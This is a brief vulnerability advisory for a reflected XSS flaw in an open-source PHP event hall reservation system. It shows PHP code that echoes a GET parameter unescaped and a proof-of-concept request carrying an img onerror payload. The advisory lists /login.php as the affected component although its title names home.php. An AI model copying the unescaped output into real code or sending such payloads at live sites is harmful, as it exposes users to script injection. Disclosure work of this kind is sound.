# MAGESH-K21 / Online-College-Event-Hall-Reservation-System - Reflected XSS home.php

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://github.com/MAGESH-K21/Online-College-Event-Hall-Reservation-System/
> 
## Affected Component
> /login.php

## Code
```php
$id=$_GET['id'];?>

 <h1 class="logo "><a href="home.php?id=<?php echo $id; ?>">Emisha</a></h1>
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /home.php?id="><img+src%3dx+onerror%3dalert("NoChizPlz")> HTTP/1.1
Host: 127.0.0.1
```

## Screenshot

![image](https://github.com/skid-nochizplz/skid-nochizplz/assets/60700937/d1e8e49c-0e17-4532-a7d4-0759555979dd)
